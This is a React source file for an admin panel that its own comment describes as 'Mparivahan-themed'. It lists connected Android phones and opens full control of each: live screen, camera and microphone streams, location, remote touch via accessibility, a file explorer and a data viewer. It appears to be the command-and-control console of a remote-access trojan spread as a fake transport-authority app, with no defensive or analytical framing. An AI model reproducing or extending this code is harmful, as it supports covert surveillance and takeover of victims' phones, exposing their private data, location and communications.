import React, { useState, useEffect } from 'react';
import {
  Box, AppBar, Toolbar, Typography, IconButton, Chip, Badge,
  Tooltip, Paper, Grid, Card, CardActionArea, CardContent,
  Avatar, Divider, Button, List, ListItemButton, ListItemText,
} from '@mui/material';
import {
  PhoneAndroid, PowerSettingsNew, Refresh, SignalCellular4Bar,
  SignalCellularOff, LocationOn, ScreenShare, CameraAlt, Mic,
  TouchApp, ArrowBack, Security, FiberManualRecord,
} from '@mui/icons-material';

import useWebSocket from '../hooks/useWebSocket';
import useWebRTC from '../hooks/useWebRTC';
import DeviceControl from './DeviceControl';

/**
 * AdminPanel
 *
 * Mparivahan-themed admin website with two views:
 *
 * 1. DEVICE LIST — Grid of all connected devices showing name, model,
 *    connection time, status dots (screen/camera/mic). Click to control.
 *
 * 2. DEVICE CONTROL — Full control panel for selected device:
 *    live screen, camera, mic, location, remote touch, file explorer, data viewer.
 */
export default function AdminPanel({ token, serverUrl, onLogout }) {
  const {
    connected, devices, selectedDevice, setSelectedDevice,
    deviceStatus, screenFrame, cameraFrame, location, lastData,
    send, refreshDevices, wsRef, webrtcSignals,
  } = useWebSocket(serverUrl, token);

  // ─── WebRTC Integration ──────────────────────────────────────────────
  const {
    pcState, remoteScreenStream, remoteCameraStream, remoteAudioStream,
    connectionStats, startScreenStream, handleSignaling, disconnect: disconnectWebRTC,
  } = useWebRTC(wsRef, selectedDevice);

  // Forward WebRTC signaling messages from device to WebRTC hook
  useEffect(() => {
    if (webrtcSignals) {
      handleSignaling(webrtcSignals);
    }
  }, [webrtcSignals, handleSignaling]);

  // Auto-start WebRTC connection when device is selected
  useEffect(() => {
    if (selectedDevice) {
      // Small delay to ensure WS is ready
      const timer = setTimeout(() => startScreenStream(), 500);
      return () => { clearTimeout(timer); disconnectWebRTC(); };
    }
  }, [selectedDevice, startScreenStream, disconnectWebRTC]);

  // Auto-refresh device list
  useEffect(() => {
    const iv = setInterval(refreshDevices, 10000);
    return () => clearInterval(iv);
  }, [refreshDevices]);

  return (
    <Box sx={{ minHeight: '100vh', backgroundColor: '#F5F5F5' }}>
      {/* ─── Top App Bar ─────────────────────────────────────── */}
      <AppBar position="sticky">
        <Toolbar>
          {selectedDevice && (
            <IconButton color="inherit" onClick={() => {
              setSelectedDevice(null);
              send('stopScreenCapture');
              send('stopCamera');
              send('stopMic');
            }} sx={{ mr: 1 }}>
              <ArrowBack />
            </IconButton>
          )}

          <PhoneAndroid sx={{ color: '#FFD54F', mr: 1 }} />
          <Typography variant="h6" sx={{ fontWeight: 700, color: '#fff' }}>
            {selectedDevice
              ? devices.find((d) => d.deviceId === selectedDevice)?.deviceName || selectedDevice
              : 'RemoteAdmin Panel'
            }
          </Typography>

          {!selectedDevice && (
            <Typography variant="caption" sx={{ color: 'rgba(255,255,255,0.7)', ml: 1, display: { xs: 'none', sm: 'block' } }}>
              Admin Control Center
            </Typography>
          )}

          <Box sx={{ flex: 1 }} />

          {/* Connection Status */}
          <Chip
            icon={connected ? <SignalCellular4Bar sx={{ fontSize: 14 }} /> : <SignalCellularOff sx={{ fontSize: 14 }} />}
            label={connected ? 'Server Online' : 'Offline'}
            color={connected ? 'success' : 'error'}
            size="small"
            sx={{ mr: 1 }}
          />

          {!selectedDevice && (
            <Tooltip title="Refresh Devices">
              <IconButton color="inherit" onClick={refreshDevices}>
                <Refresh />
              </IconButton>
            </Tooltip>
          )}

          <Tooltip title="Disconnect">
            <IconButton color="inherit" onClick={onLogout}>
              <PowerSettingsNew />
            </IconButton>
          </Tooltip>
        </Toolbar>
        <Box sx={{ height: 3, background: 'linear-gradient(90deg, #FF6F00, #FFA040, #FF6F00)' }} />
      </AppBar>

      {/* ─── Content ──────────────────────────────────────────── */}
      {!selectedDevice ? (
        <DeviceListView
          devices={devices}
          connected={connected}
          onSelect={setSelectedDevice}
          onRefresh={refreshDevices}
        />
      ) : (
        <DeviceControl
          deviceId={selectedDevice}
          send={send}
          deviceStatus={deviceStatus[selectedDevice] || {}}
          screenFrame={screenFrame}
          cameraFrame={cameraFrame}
          location={location}
          lastData={lastData}
          remoteScreenStream={remoteScreenStream}
          remoteCameraStream={remoteCameraStream}
          remoteAudioStream={remoteAudioStream}
          pcState={pcState}
          connectionStats={connectionStats}
        />
      )}
    </Box>
  );
}

/**
 * DeviceListView — Grid of all connected devices
 */
function DeviceListView({ devices, connected, onSelect, onRefresh }) {
  const now = Date.now();

  return (
    <Box sx={{ maxWidth: 1200, mx: 'auto', p: { xs: 2, md: 3 } }}>
      {/* Header */}
      <Paper sx={{
        p: 3, mb: 3, borderRadius: 3,
        background: 'linear-gradient(135deg, #E3F2FD 0%, #F5F5F5 100%)',
        border: '1px solid #BBDEFB',
      }}>
        <Box sx={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
          <Box>
            <Typography variant="h5" sx={{ fontWeight: 700, color: '#0D47A1' }}>
              Connected Devices
            </Typography>
            <Typography variant="body2" sx={{ color: '#757575', mt: 0.5 }}>
              {devices.length === 0
                ? 'No devices connected. Ensure the app is installed and running.'
                : `${devices.length} device(s) online — click to control`
              }
            </Typography>
          </Box>
          <Chip
            label={`${devices.length} Online`}
            color={devices.length > 0 ? 'success' : 'default'}
            sx={{ fontWeight: 700 }}
          />
        </Box>
      </Paper>

      {/* Device Grid */}
      {devices.length === 0 ? (
        <Paper sx={{ p: 6, textAlign: 'center', borderRadius: 3 }}>
          <PhoneAndroid sx={{ fontSize: 64, color: '#E0E0E0', mb: 2 }} />
          <Typography variant="h6" sx={{ color: '#9E9E9E' }}>
            Waiting for devices...
          </Typography>
          <Typography variant="body2" sx={{ color: '#BDBDBD', mt: 1 }}>
            Install the app on a phone, complete setup, and it will appear here.
          </Typography>
          <Button
            variant="outlined"
            startIcon={<Refresh />}
            onClick={onRefresh}
            sx={{ mt: 3, borderColor: '#1565C0', color: '#1565C0' }}
          >
            Refresh
          </Button>
        </Paper>
      ) : (
        <Grid container spacing={2}>
          {devices.map((device) => (
            <Grid item xs={12} sm={6} md={4} key={device.deviceId}>
              <DeviceCard
                device={device}
                status={device.status || {}}
                onClick={() => onSelect(device.deviceId)}
              />
            </Grid>
          ))}
        </Grid>
      )}
    </Box>
  );
}

/**
 * DeviceCard — Single device card with name, model, time, status dots
 */
function DeviceCard({ device, status, onClick }) {
  const [now, setNow] = useState(Date.now());
  useEffect(() => {
    const iv = setInterval(() => setNow(Date.now()), 60000);
    return () => clearInterval(iv);
  }, []);

  const connectedAgo = formatTimeAgo(device.connectedAt || now, now);
  const isActive = status.screenCapture || status.camera || status.mic;
  const model = device.deviceInfo?.model || 'Android Device';
  const androidVer = device.deviceInfo?.androidVersion || '';
  const battery = device.deviceInfo?.batteryLevel;

  return (
    <Card
      sx={{
        borderRadius: 3,
        border: '1px solid #E0E0E0',
        transition: 'all 0.2s ease',
        '&:hover': {
          boxShadow: '0 8px 24px rgba(21,101,192,0.15)',
          transform: 'translateY(-2px)',
          borderColor: '#1565C0',
        },
      }}
    >
      <CardActionArea onClick={onClick} sx={{ p: 0 }}>
        <CardContent sx={{ p: 2.5 }}>
          {/* Device Header */}
          <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5, mb: 1.5 }}>
            <Avatar sx={{
              bgcolor: isActive ? '#E3F2FD' : '#F5F5F5',
              color: isActive ? '#1565C0' : '#9E9E9E',
              width: 44, height: 44,
            }}>
              <PhoneAndroid />
            </Avatar>
            <Box sx={{ flex: 1, minWidth: 0 }}>
              <Typography variant="subtitle1" sx={{ fontWeight: 700, color: '#212121' }} noWrap>
                {device.deviceName || device.deviceId}
              </Typography>
              <Typography variant="caption" sx={{ color: '#757575' }}>
                {model} {androidVer && `• Android ${androidVer}`}
              </Typography>
            </Box>
          </Box>

          {/* Status Dots */}
          <Box sx={{ display: 'flex', gap: 0.75, mb: 1.5 }}>
            <StatusDot label="Screen" active={status.screenCapture} />
            <StatusDot label="Camera" active={status.camera} />
            <StatusDot label="Mic" active={status.mic} />
            {status.accessibility && <StatusDot label="Control" active />}
            {battery != null && (
              <Chip
                label={`${battery}%`}
                size="small"
                sx={{
                  height: 20, fontSize: '0.65rem', fontWeight: 700,
                  backgroundColor: battery > 20 ? '#E8F5E9' : '#FFEBEE',
                  color: battery > 20 ? '#2E7D32' : '#C62828',
                }}
              />
            )}
          </Box>

          {/* Connection Info */}
          <Box sx={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
            <Typography variant="caption" sx={{ color: '#9E9E9E' }}>
              Connected {connectedAgo}
            </Typography>
            <Box sx={{ display: 'flex', alignItems: 'center', gap: 0.5 }}>
              <FiberManualRecord sx={{ fontSize: 8, color: '#2E7D32' }} />
              <Typography variant="caption" sx={{ color: '#2E7D32', fontWeight: 600 }}>
                Online
              </Typography>
            </Box>
          </Box>

          {/* CTA */}
          <Button
            fullWidth
            variant="contained"
            size="small"
            startIcon={<TouchApp />}
            sx={{
              mt: 1.5,
              py: 0.75,
              background: 'linear-gradient(135deg, #1565C0, #1976D2)',
              fontWeight: 600,
            }}
          >
            CONTROL DEVICE
          </Button>
        </CardContent>
      </CardActionArea>
    </Card>
  );
}

function StatusDot({ label, active }) {
  return (
    <Tooltip title={label}>
      <Chip
        size="small"
        label={label}
        sx={{
          height: 20, fontSize: '0.6rem', fontWeight: 600,
          backgroundColor: active ? '#E3F2FD' : '#F5F5F5',
          color: active ? '#1565C0' : '#BDBDBD',
          border: `1px solid ${active ? '#BBDEFB' : '#E0E0E0'}`,
          '& .MuiChip-label': { px: 0.75 },
        }}
      />
    </Tooltip>
  );
}

function formatTimeAgo(timestamp, now) {
  const diff = Math.floor((now - timestamp) / 1000);
  if (diff < 60) return 'just now';
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
  return `${Math.floor(diff / 86400)}d ago`;
}
